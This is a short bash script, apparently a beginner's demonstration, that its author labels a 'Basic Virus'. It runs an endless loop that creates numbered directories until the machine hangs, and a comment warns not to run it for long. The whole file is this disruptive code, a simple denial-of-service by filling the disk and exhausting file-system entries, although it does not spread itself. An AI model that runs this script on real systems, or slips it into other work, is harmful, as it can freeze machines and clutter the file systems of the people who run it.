#
# @author: M Rumman
# Program: Basic Virus
# Desc: Code will make infinite folders
# 
# NOTE: Donot run this code for too long, your system will hang
# 

count=0
while [ true ]
do
`mkdir $count`
((count++))
done
